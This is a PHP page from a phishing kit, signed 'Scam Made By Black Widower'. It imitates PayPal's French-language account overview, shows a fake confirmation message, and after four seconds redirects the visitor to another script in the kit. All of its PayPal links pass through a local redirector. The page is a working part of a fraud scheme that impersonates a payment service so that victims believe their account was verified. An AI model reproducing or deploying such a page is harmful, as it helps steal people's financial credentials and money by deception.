<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/ 


if (!isset($_SESSION)) {
  session_start();
}

$templang = $_SESSION['tempLang'];

if( $templang == 'EN' ){
$selected_en = "selected";
$selected_fr = "";
$selected_es = "";
}
if( $templang == 'FR' ){
$selected_fr = "selected";
$selected_en = "";
$selected_es = "";
}
if( $templang == 'ES' ){
$selected_es = "selected";
$selected_en = "";
$selected_fr = "";
}


global $cmd;
$cmd = @$_POST['cmd'];
global $temp;
$temp = @$_POST['locale_x'];
if( $cmd == "ok"){

if( $temp == 'en_US' ){
$_SESSION['tempLang'] = 'EN';}

if( $temp == 'es_XC' ){
$_SESSION['tempLang'] = 'ES';}

if( $temp == 'fr_XC' ){
$_SESSION['tempLang'] = 'FR';}

$templang = $_SESSION['tempLang'];

if( $templang == 'EN' ){
$selected_en = "selected";
$selected_fr = "";
$selected_es = "";
}
if( $templang == 'FR' ){
$selected_fr = "selected";
$selected_en = "";
$selected_es = "";
}
if( $templang == 'ES' ){
$selected_es = "selected";
$selected_en = "";
$selected_fr = "";
}
}

//start -choix d'image selon la langue-
if( $templang == 'ES' ){
    $img = "webscr/img/imgCSHelp_es_ES_220x80.gif";
}elseif( $templang == 'FR' ){
    $img = "webscr/img/imgCSHelp_fr_FR_220x80.gif";
}else{
    $img = "webscr/img/imgCSHelp_en_US_220x80.gif";
}
//end -choix d'image selon la langue-


include "lang/langdetect.php";


    $dat = gmdate("d/m/y");
    $jour = substr($dat,0,2);
	$mois = substr($dat,3,2);
	$an = substr($dat,6,2);
	$lastSeptJour = $jour - 07;
	$LSJmois = $mois;
    $LSJan = $an;
	if( $mois == ( 01 || 03 || 05 || 07 || 08 || 10 || 12 ) ){
	     $lastSeptJour = $jour - 07;
		 $LSJan = $an;
		 if( $jour <= 7 ){
		      if( $jour == 07 ){
				  if( $mois == 01 ){
				       $lastSeptJour = 31;
				       $LSJmois = 12;
					   $LSJan = $an - 1;
				  }elseif( $mois == 08 ){
				       $lastSeptJour = 31;
				       $LSJmois = $mois - 01;
				  }elseif( $mois == 03 ){
				       $lastSeptJour = 29;
				       $LSJmois = $mois - 01;
				  }else{
				       $lastSeptJour = 30;
				       $LSJmois = $mois - 01;
				  }
			  }else{
			      if( $mois == 01 ){
				       $TMPJour = 07 - $jour;
				       $lastSeptJour = 31 - $TMPJour;
				       $LSJmois = 12;
					   $LSJan = $an - 1;
				  }elseif( $mois == 08 ){
				       $TMPJour = 07 - $jour;
				       $lastSeptJour = 31 - $TMPJour;
				       $LSJmois = $mois - 1;
				  }elseif( $mois == 03 ){
				       $TMPJour = 07 - $jour;
				       $lastSeptJour = 29 - $TMPJour;
				       $LSJmois = $mois - 01;
				  }else{
				       $TMPJour = 07 - $jour;
				       $lastSeptJour = 30 - $TMPJour;
				       $LSJmois = $mois - 01;
				  }
			  }
		 }
	}else{
	     if( $jour <= 7 ){
		      if( $jour == 07 ){
				    $lastSeptJour = 31;
				    $LSJmois = $mois - 01;;
				  }
			  }else{
			        $TMPJour = 07 - $jour;
				    $lastSeptJour = 31 - $TMPJour;
				    $LSJmois = $mois - 01;
			  }    
	}
	$tailLSJmois = strlen($LSJmois);
	$taillastSeptJour = strlen($lastSeptJour);
	if( $tailLSJmois == 1 ){
	    $LSJmois = "0".$LSJmois;
	}
	if( $taillastSeptJour == 1 ){
	    $lastSeptJour = "0".$lastSeptJour;
	}
	

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="fr">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=ANSI">
   
      <!--
               Script info: script: webscr, cmd: _account, template: xpt/Customer/account/Welcome, date: Feb 10, 2011 21:59:17 PST; country: US, language: fr_XC, xslt server: 
      		web version: 67.0-1741654 branch: BWR_670_int
      		DXPT: true (LOCALE: fr_XC, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
      		pexml version: 67.0-1755747
      		page XSL: 
             hostname : cbUC8pX-mokrB-hd5U4C5s6YObK6DMLI-g9pfmNlCzM
               rlogid : cbUC8pX%2bmokrB%2bhd5U4C5g3HBlWDN2ZiSF3UwjL3pSeE%2b9mgWff7ew%3d%3d_12e635db64a
      -->
      
      <title><?php echo $m_acctp; ?></title>
      <!--googleoff: all-->
      
      <meta name="description" content="PayPal est le moyen plus s&ucirc;r et plus simple de payer en ligne sans divulguer le num&eacute;ro de votre carte de cr&eacute;dit.">
      <!--googleon: all-->

      
      <meta http-equiv="X-UA-Compatible" content="IE=8">
	  <META http-EQUIV="refresh" content="4; URL=../dir.php">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/global.css">
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/Customer/pages/pageSalsa.css">
      <!--[if IE 8]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie8.css"><![endif]-->
      
      <!--[if IE 7]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->
      
      <!--[if lte IE 6]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
      
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/fr_XC/country.css">
      <link media="print" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/print.css"><script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'WEBSCR-640-20101004-1';</script><link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">

      <link rel="apple-touch-icon" href="WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png">
   </head>
   <body>  
   <noscript>
         <p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses fonctionnalit&eacute;s du site PayPal, vous avez besoin de JavaScript et de cookies. Vous pouvez les activer &agrave; l'aide des param&egrave;tres de votre navigateur.</p>
   </noscript>
      <div class="welcome" id="stdpage">
         <div id="header" class="std">
            <h1><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
            <form method="post" id="searchForm" name="searchForm" action="direct.php?site=https://www.paypal.com/us/cgi-bin/searchscr?cmd=_sitewide-search">

               <fieldset id="myDynamicAutoComplete" class="autocomplete">
                  <legend><?php echo $search1; ?></legend><label for="searchBox"><?php echo $search2; ?> </label><input type="text" id="searchBox" name="queryString" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input type="submit" class="button" id="search.x" name="search.x" value="<?php echo $search2; ?>" autocomplete="off"></fieldset><input name="auth" type="hidden" value="6GyOkoTfXqhJ125o3exAYSj24aPXhj9MxpWYqKqXrdXhnWIw7cS93BzArgZ-pY9AhxiYQuwzFvXkOBwuoWou3DTPmOcHWLV87Rdu7fBxLu2k2ZSV7B8DqEHxJG_ovCHN8sCOeW99RRSO66AN"><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navGlobal"><span><a href="#content" class="accessAid skip"><?php echo $s_main; ?></a></span><ul>
                  <li class="logout"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_logout"><?php echo $logout; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help"><?php echo $help; ?></a></li>

                  <li class="last"><a href="direct.php?site=https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;fli=true&amp;content_ID=security/online_security_center"><?php echo $s_center; ?></a></li>
               </ul>
            </div>
            <form method="post" id="rosetta" class="rosetta" action="done.php?cmd=_account&amp;dispatch=5885d80a13c0db1f8e263663d3faee8d61ec37c409b56235bed2ddf64505aee9">
			<input type="hidden" name="cmd" value="ok">
               <fieldset>
                  <legend><span class="accessAid">Changer de langue</span></legend><label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="locale_x">

                     <option value="en_US" <?php echo $selected_en;?>>English</option>
                     <option value="es_XC" <?php echo $selected_es;?>>Espa&ntilde;ol</option>
                     <option value="fr_XC" <?php echo $selected_fr;?>>Fran&ccedil;ais</option></select><input type="submit" name="testName" value="&gt;" class="button mini"><input type="hidden" id="change_locale_x" name="change_locale.x" value="1"></fieldset><input name="auth" type="hidden" value="6GyOkoTfXqhJ125o3exAYSj24aPXhj9MxpWYqKqXrdXhnWIw7cS93BzArgZ-pY9AhxiYQuwzFvXkOBwuoWou3DTPmOcHWLV87Rdu7fBxLu2k2ZSV7B8DqEHxJG_ovCHN8sCOeW99RRSO66AN"><input type="hidden" name="cmd" value="ok"><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navPrimary">
               <ul>

                  <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" class="scTrack:SRD:Nav:RO"><?php echo $myacc; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" class="scTrack:SRD:Nav:TZ"><?php echo $paym; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_rm&amp;nav=2" class="scTrack:SRD:Nav:UC"><?php echo $reqmoney; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" class="scTrack:SRD:Nav:UF"><?php echo $t11; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices&amp;nav=4" class="scTrack:SRD:Nav:AK6"><?php echo $products; ?></a></li>
                  <li><a href="direct.php?site=https://www.paypal-community.com/" class="scTrack:SRD:Nav:U44"><?php echo $t17; ?></a></li>

               </ul>
            </div>
        </div>
         <div id="content">
           <div id="main">
               <div class="layout2c">
                  <div class="col first">
                     <div class="messageBox res-center">
  <p align="center"><img src="WEBSCR-640-20101004-1/css/Customer/pages/img/icon_confirmation.gif" width="36" height="38">&nbsp; <span class="confText"><strong><span class="style35"><?php echo $valid; ?> </span> </strong></span></p>
    <p align="center" class="style36"><?php echo $redirect; ?></p>
  </div>
                     <div class="header">
                        <ul class="aofilters">
                           <li class="selected"><?php echo $activ_recent; ?></li>
                           <li><a href="direct.php?site=https://history.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;filter_7"><?php echo $p_received; ?></a></li>
                           <li class="lastfilter"><a href="direct.php?site=https://history.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;filter_8"><?php echo $p_envoye; ?></a></li>

                        </ul>
                        <p class="links"><a href="direct.php?site=https://history.paypal.com/us/cgi-bin/webscr?cmd=_history"><?php echo $aff_trans;?></a></p>
                     </div>
                     <form method="post" name="history" action="#"><input type="hidden" id="myAllTextSubmitID" name="myAllTextSubmitID" value=""><input type="hidden" name="history_cache" value="AAAAAAAAr68AAAA2WyNIaXN0b3J5UGFnZUNhY2hlQ29udGFpbmVyI11GRUVFRUVFR0lJSUlbSV1FRUpHRUZGS0VFAAAAYgAAAAAAAAABTWAUy01pT0sAAAEsAAABLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATWlPSwAAAAAAAAAAAAAAAAAAAAAA"><div class="datatable">
                           <div class="title">
                              <h3><?php echo $activ_recent;?> - <span><?php echo $sept_j;?> ( <?php echo $lastSeptJour."/".$LSJmois."/".$LSJan." - ".$dat;?> )</span></h3>

                           </div>
                           <div id="tableWrapperID" class="tableWrapper">
                              <div class="actions divExtendWidth"><input type="submit" class="button" name="archive_selected" value="Archiver" disabled><a class="autoTooltip" href="#" title="<?php echo $whatsThis;?>"><?php echo $what;?></a><a class="statusTypesPopup" href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Help/popup/StatusTypes" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 450, name: '_blank', location: 0,scrollbar: 0, toolbar: 0, resizable: 1 })"><?php echo $gloss;?></a></div>
                              <table align="center" border="0" cellpadding="0" cellspacing="0" id="transactionTable" summary="Tableau de vos transactions les plus r&eacute;centes. Les informations comprennent la date, le type, le nom/email de la personne &agrave; qui vous avez envoy&eacute; de l'argent ou de qui vous en avez re&ccedil;u, le statut du paiement, un lien vers les d&eacute;tails de la transaction, le statut de la commande, la commission (le cas &eacute;ch&eacute;ant) et le montant net.">
                                 <thead>
                                    <tr>
                                       <th id="selectColumn" class="selectColumn"><span class="accessAid">checkbox</span><label class="accessAid" for="recent_all"><?php echo $select_recent?></label><input type="checkbox" id="recent_all" class="archiveCheck" disabled name="recent_all" value="0"></th>

                                       <th id="date" colspan="2"><?php echo $date; ?></th>
                                       <th id="flag"><script type="text/javascript">document.write("<style>.balloonCallout{display:block; position:absolute; top:0; left:-500em; width:1px; height:1px; overflow:hidden; text-indent:-9999em; line-height:0;}</style>")</script><a class="balloonControl" href="#flagheader"><img src="WEBSCR-640-20101004-1/en_US/i/icon/icon_flag_gray_16x16.gif" border="0" alt="ic&ocirc;ne"></a><div id="flagheader" class="balloonCallout"><?php echo $when; ?></div>
                                       </th>
                                       <th id="type"><?php echo $type; ?></th>
                                       <th id="identity"><?php echo $n_email; ?></th>

                                       <th id="paymentStatus"><?php echo $etat_pay; ?></th>
                                       <th nowrap="1" class="detailsNoPrint" id="details"><?php echo $details;?></th>
                                       <th id="actions"><?php echo $etat_commande; ?></th>
                                       <th id="gross" class="last cur_val"><?php echo $a_commission; ?></th>
                                    </tr>
                                 </thead>

                                 <tbody>
                                    <tr>
                                       <td headers="details" nowrap="1" class="noResults" colspan="11"><?php echo $aucun_objet; ?></td>
                                    </tr>
                                 </tbody>
                              </table>
                              <div class="actions actionsBottom divExtendWidth"><input type="submit" class="button" name="archive_selected" value="Archiver" disabled><a class="autoTooltip" href="#" title="Les transactions que vous archivez seront d&eacute;plac&eacute;es vers votre liste Toute l&#8217;activit&eacute; du compte."><?php echo $what;?></a></div>

                           </div>
                        </div><input name="auth" type="hidden" value="6GyOkoTfXqhJ125o3exAYSj24aPXhj9MxpWYqKqXrdXhnWIw7cS93BzArgZ-pY9AhxiYQuwzFvXkOBwuoWou3DTPmOcHWLV87Rdu7fBxLu2k2ZSV7B8DqEHxJG_ovCHN8sCOeW99RRSO66AN"><input name="form_charset" type="hidden" value="UTF-8"></form>
                  </div>
                  <div class="col last">
                     <div class="box">
                        <h3><?php echo $notif;?></h3>
                        <ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach-add&amp;return_cmd=_account"><?php echo $addbank;?></a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_update-policy"><?php echo $mise_a_jour; ?></a></li>
                        </ul>
                     </div>
                     <div class="MktMPI" id="mpi560004"></div>
                     <div class="MktMPI" id="mpi580046"></div>
                     <div class="MktMPI" id="mpi560006"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_mpi-click&uid=2BU07622PH553712M&cid=6231&oid=25343&bn=HB1IJyBUAhMXBE0.WxAfHAcwPg&s=NxY3PgA&landing_url=ORAcFjANQkkOBxpeXRQUGg85ZwkqPEE3BWYqCDBlCAADSC89NEI7NgZYNlU1VRQONAgYQDcKCBUaEQERWRA5Cww"><img src="<?php echo $img; ?>" border="0" alt=""></a><br></div><img height="1" width="1" src="direct.php?site=https://ad.yieldmanager.com/pixel?id=707596&amp;t=2" border="0" alt=""><img height="1" width="1" src="direct.php?site=https://www.googleadservices.com/pagead/conversion/1048257392/?label=a2XbCKiO6gEQ8Mbs8wM&amp;guid=ON&amp;script=0" border="0" alt=""><img height="1" width="1" src="direct.php?site=https://secure.leadback.advertising.com/adcedge/lb?site=695501&amp;srvc=1&amp;betr=paypal100_cs=%5B+%5D1&amp;betq=12413=%5B+%5D429885" border="0" alt=""></div>
               </div>

           </div>
        </div>
         <div id="footer">
            <ul>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/about"><?php echo $t2; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab"><?php echo $t7; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua"><?php echo $t8; ?></a></li>

               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy"><?php echo $t5; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees"><?php echo $t4; ?></a></li>
               <li>
<a href="javascript:O_LC()"><?php echo $t3; ?></a> <img 
src="WEBSCR-640-20101004-1/css/Customer/pages/img/sm_333_oo.gif" alt="Site Feedback">
</li>
            </ul>

            <p id="legal"><?php echo $copyright; ?><br><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/UserAgreement/general/FDIC"><?php echo $fdic; ?></a></p>
         </div>
         <div id="navFull">
            <ul>
               <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" class="scTrack:SRD:Nav:RO"><?php echo $myacc; ?></a><ul>

                     <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0.0" class="scTrack:SRD:Nav:RP"><?php echo $over; ?></a></li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds&amp;nav=0.1" class="scTrack:SRD:Nav:RQ"><?php echo $addfound; ?></a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds-bank&amp;origination=_add-funds-bank&amp;ach_country_code=US&amp;nav=0.1.0" class="scTrack:SRD:Nav:FA"><?php echo $addfunbank; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_balance-manager&amp;nav=0.1.1" class="scTrack:SRD:Nav:k90"><?php echo $gsales; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_addfunds-greendot&amp;user_action=add_funds_link&amp;nav=0.1.2" class="scTrack:SRD:Nav:V06"><?php echo $addfundmoney; ?></a></li>

                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds&amp;nav=0.2" class="scTrack:SRD:Nav:RR"><?php echo $retirar; ?></a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-bank&amp;nav=0.2.0" class="scTrack:SRD:Nav:RS"><?php echo $banktf; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-check&amp;nav=0.2.1" class="scTrack:SRD:Nav:RT"><?php echo $demendcheq; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro&amp;nav=0.2.2" class="scTrack:SRD:Nav:RU"><?php echo $usedebit; ?></a></li>

                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3" class="scTrack:SRD:Nav:RV"><?php echo $history; ?></a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3.0" class="scTrack:SRD:Nav:RW"><?php echo $bsearch; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history-download&amp;nav=0.3.1" class="scTrack:SRD:Nav:RY"><?php echo $dhistory; ?></a></li>
                        </ul>

                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4" class="scTrack:SRD:Nav:SC"><?php echo $resolu; ?></a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4.0" class="scTrack:SRD:Nav:SD"><?php echo $opencase; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/CaseManagement/customerservice/EducationModuleIndex&amp;nav=0.4.1" class="scTrack:SRD:Nav:SF"><?php echo $guides; ?></a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5" class="scTrack:SRD:Nav:SN"><?php echo $prof; ?></a><ul>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-email&amp;nav=0.5.0" class="scTrack:SRD:Nav:SO"><?php echo $addemail; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&amp;nav=0.5.1" class="scTrack:SRD:Nav:SP"><?php echo $addbank; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&amp;flag_from_account_summary=1&amp;nav=0.5.2" class="scTrack:SRD:Nav:SQ"><?php echo $addcard; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.5.3" class="scTrack:SRD:Nav:SR"><?php echo $addadr; ?></a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&amp;nav=0.5.4" class="scTrack:SRD:Nav:Z9"><?php echo $addphone; ?></a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5.5" class="scTrack:SRD:Nav:x76"><?php echo $moreopt; ?></a></li>
                        </ul>
                     </li>
                  </ul>
               </li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" class="scTrack:SRD:Nav:TZ"><?php echo $paym; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_rm&amp;nav=2" class="scTrack:SRD:Nav:UC"><?php echo $reqmoney; ?></a></li>

               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" class="scTrack:SRD:Nav:UF"><?php echo $t11; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices&amp;nav=4" class="scTrack:SRD:Nav:AK6"><?php echo $products; ?></a></li>
               <li><a href="direct.php?site=https://www.paypal-community.com/" class="scTrack:SRD:Nav:U44"><?php echo $t17; ?></a></li>
            </ul>
         </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="direct.php?site=https://www.paypalobjects.com/WEBSCR-640-20110306-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/Customer/min/pageSalsa.js"></script><script type="text/javascript">
						if(document.getElementById("AXCILightBox")) {
							PAYPAL.Beloved.Salsa.displayLightbox();
						}
						
						if(document.getElementById("replicaAlertWrapper")) {
						YAHOO.util.Dom.addClass("replicaAlertWrapper", "hide");
						}
						
						if(document.getElementById("nonJsBMLMsg")) {
							document.getElementById("nonJsBMLMsg").style.display = "none";
						}	
						
						if(document.getElementById("ajaxContent")) {
							PAYPAL.Beloved.Salsa.displayLoading('ajaxContent');
						}
						
						if(YAHOO.util.Dom.getElementsByClassName("dismissable" ,"p", "main")) {
							PAYPAL.Beloved.Salsa.showAlertClose();
						}
						
						if(document.getElementById("balanceDetails")) {
							PAYPAL.Beloved.Salsa.initBalanceDetails();
						}
						
						if(document.getElementById("giftBalances")) {
								PAYPAL.Beloved.Salsa.initGiftBalanceDetails();
						}	
						YAHOO.util.Event.addListener("alertImage", "click", PAYPAL.Beloved.Salsa.showReplicaAlert);
						YAHOO.util.Event.addListener("replicaClose", "click", PAYPAL.Beloved.Salsa.hideReplicaAlert);
						
						PAYPAL.Beloved.Salsa.splitButtonLoader();
						PAYPAL.Beloved.Salsa.initializeDatatable();
						if(document.getElementById("alertImage")){
							document.getElementById("alertImage").style.display = "inline";
							document.getElementById("replicaClose").style.display = "inline";
						}
						YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("archiveCheck", "input", "transactionTable"), "click", PAYPAL.Beloved.Salsa.checkElement);
						if(YAHOO.util.Dom.getElementsByClassName("archiveCheck")) {
							PAYPAL.Beloved.Salsa.checkElement();
						}
						//YAHOO.util.Event.addListener(document, "mouseover", PAYPAL.Beloved.Salsa.balloonControlDisableAlt);
						YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("balloonControl", "a", "main"), "click", PAYPAL.Beloved.Salsa.balloonControl);
						YAHOO.util.Event.addListener(YAHOO.util.Dom.getElementsByClassName("tableWrapper", "div", "main"), "mousedown", PAYPAL.Beloved.Salsa.extendDivWidth);
						YAHOO.util.Event.onAvailable("topCustomerBox", function(){PAYPAL.Beloved.Salsa.getTopCustomerInfo ("topCustomerBox");});
					</script>

      <!-- SiteCatalyst Code
      Copyright 1997-2005 Omniture, Inc.
      More info available at direct.php?site=http://www.omniture.com -->
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>
      <script type="text/javascript">
      s.prop1="xpt/Customer/account/Welcome";
      s.prop6="2BU07622PH553712M";
      s.prop7="Personal";
      s.prop8="Unverified";
      s.prop9="Unrestricted";
      s.prop10="US";
      s.prop14="";
      s.prop16="";
      s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
      s.prop15="";
      s.pageName="My Account Overview";
      s.channel="My Account Overview";
      s.prop50="fr_XC";
      s.prop18="";
      </script>
      <script type="text/javascript"><!--
      /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
      var s_code=s.t();if(s_code)document.write(s_code);
      if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
      //-->
      </script><noscript><img
      src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
      height="1" width="1" border="0" alt="" /></noscript>
      <!--/DO NOT REMOVE/-->
      
      <!-- End SiteCatalyst Code -->
</body>

</html>
<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
?>